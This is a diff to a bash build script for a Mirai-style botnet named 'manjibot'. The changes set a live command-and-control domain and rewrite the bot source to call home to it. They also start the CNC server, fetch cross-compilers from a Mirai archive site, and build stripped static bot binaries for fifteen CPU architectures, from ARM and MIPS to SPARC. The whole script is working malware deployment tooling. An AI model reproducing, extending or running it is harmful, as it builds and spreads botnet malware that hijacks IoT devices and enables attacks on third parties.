@@ -32,8 +32,8 @@ log() {
     esac
 }
 
-CNC_DOMAIN=""
-REPO_URL="https://github.com/nettproxy/manjibot.git"
+CNC_DOMAIN="boobnet.duckdns.org"
+REPO_URL="https://github.com/sidqjhzadh313/manjibot.git"
 
 while [[ $# -gt 0 ]]; do
     case $1 in
@@ -76,7 +76,7 @@ export DEBIAN_FRONTEND=noninteractive
 
 log INFO "Installing required packages"
 apt-get update -yq >/dev/null 2>&1
-apt-get install -yq wget unzip gcc snapd screen bzip2 git >/dev/null 2>&1
+apt-get install -yq wget unzip gcc snapd screen bzip2 git tar >/dev/null 2>&1
 
 if ! command -v go &> /dev/null; then
     log INFO "Installing Go via snap"
@@ -105,33 +105,71 @@ log INFO "CNC started. View with: screen -x cnc"
 
 log INFO "Updating bot configuration"
 cd "$WORK_DIR/source"
-sed -i "s/resolv_lookup(\"yourdomain.com\");/resolv_lookup(\"$CNC_DOMAIN\");/g" bot/main.c
+sed -i 's/resolv_lookup("yourdomain.com");/resolv_lookup("'"$CNC_DOMAIN"'");/g' bot/main.c
 
 log INFO "Preparing cross-compilers"
 mkdir -p /etc/xcompile
 cd /etc/xcompile
 
+# Array of all architectures from the directory listing
+ARCHES=(
+    "armv4l"
+    "armv5l"
+    "armv6l"
+    "armv7l"
+    "i486"
+    "i586"
+    "i686"
+    "m68k"
+    "mips"
+    "mipsel"
+    "powerpc-440fp"
+    "powerpc"
+    "sh4"
+    "sparc"
+    "x86_64"
+)
+
 download_compiler() {
     local arch="$1"
+    local ext="$2"
+    
     if [ ! -d "/etc/xcompile/$arch" ]; then
         log INFO "Downloading $arch compiler"
-        wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2"
-        if [ $? -eq 0 ]; then
-            tar -xjf "$arch.tar.bz2" >/dev/null 2>&1
-            mv "cross-compiler-$arch" "$arch"
-            rm -f "$arch.tar.bz2"
-        else
-            log WARN "Failed to download $arch compiler"
-        fi
+        
+        case "$ext" in
+            "tar.gz")
+                wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.gz" -O "$arch.tar.gz"
+                if [ $? -eq 0 ]; then
+                    tar -xzf "$arch.tar.gz" >/dev/null 2>&1
+                    mv "cross-compiler-$arch" "$arch" 2>/dev/null || true
+                    rm -f "$arch.tar.gz"
+                else
+                    log WARN "Failed to download $arch compiler (tar.gz)"
+                fi
+                ;;
+            *)
+                wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2"
+                if [ $? -eq 0 ]; then
+                    tar -xjf "$arch.tar.bz2" >/dev/null 2>&1
+                    mv "cross-compiler-$arch" "$arch" 2>/dev/null || true
+                    rm -f "$arch.tar.bz2"
+                else
+                    log WARN "Failed to download $arch compiler (tar.bz2)"
+                fi
+                ;;
+        esac
     fi
 }
 
-download_compiler "armv7l"
-download_compiler "armv5l"
-download_compiler "mips"
-download_compiler "mipsel"
-download_compiler "i586"
-download_compiler "x86_64"
+# Download all compilers
+for arch in "${ARCHES[@]}"; do
+    if [[ "$arch" == "i486" ]]; then
+        download_compiler "$arch" "tar.gz"
+    else
+        download_compiler "$arch" "tar.bz2"
+    fi
+done
 
 cd "$WORK_DIR/source"
 mkdir -p release
@@ -146,7 +184,7 @@ compile_bot() {
         if command -v "$arch-gcc" &> /dev/null; then
             compiler="$arch-gcc"
         else
-            log ERROR "Compiler for $arch not found"
+            log WARN "Compiler for $arch not found, skipping"
             return 1
         fi
     fi
@@ -154,22 +192,39 @@ compile_bot() {
     log INFO "Compiling for $output..."
     "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" 2>/dev/null
     
-    if [ $? -eq 0 ]; then
+    if [ $? -eq 0 ] && [ -f "release/$output" ]; then
         local strip="${compiler%-gcc}-strip"
         if [ -f "$strip" ] || command -v "$strip" &> /dev/null; then
             "$strip" "release/$output" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null
         fi
-        log INFO "Successfully compiled $output"
+        log INFO "Successfully compiled $output (${arch})"
     else
-        log ERROR "Failed to compile $output"
+        log WARN "Failed to compile $output (${arch})"
     fi
 }
 
-compile_bot "armv7l" "manji.arm7" "-static"
+# Compile all architectures with appropriate output names and flags
+compile_bot "armv4l" "manji.arm4" "-static"
 compile_bot "armv5l" "manji.arm5" "-static"
+compile_bot "armv6l" "manji.arm6" "-static"
+compile_bot "armv7l" "manji.arm7" "-static"
+compile_bot "i486" "manji.i486" "-static"
 compile_bot "i586" "manji.x86" "-static"
-compile_bot "x86_64" "manji.dbg" "-static -DDEBUG"
+compile_bot "i686" "manji.i686" "-static"
+compile_bot "m68k" "manji.m68k" "-static"
+compile_bot "mips" "manji.mips" "-static"
+compile_bot "mipsel" "manji.mipse" "-static"
+compile_bot "powerpc-440fp" "manji.ppc440" "-static"
+compile_bot "powerpc" "manji.ppc" "-static"
+compile_bot "sh4" "manji.sh4" "-static"
+compile_bot "sparc" "manji.sparc" "-static"
+compile_bot "x86_64" "manji.x64" "-static -DDEBUG"
 
 log INFO "Build process complete"
 log INFO "Binaries available in: $WORK_DIR/source/release/"
-ls -lh "$WORK_DIR/source/release/"
+echo ""
+log INFO "Available binaries:"
+ls -lh "$WORK_DIR/source/release/" 2>/dev/null || log WARN "No binaries compiled (check compiler downloads)"
+echo ""
+log INFO "CNC running on screen session 'cnc'"
+log INFO "Domain configured: $CNC_DOMAIN"
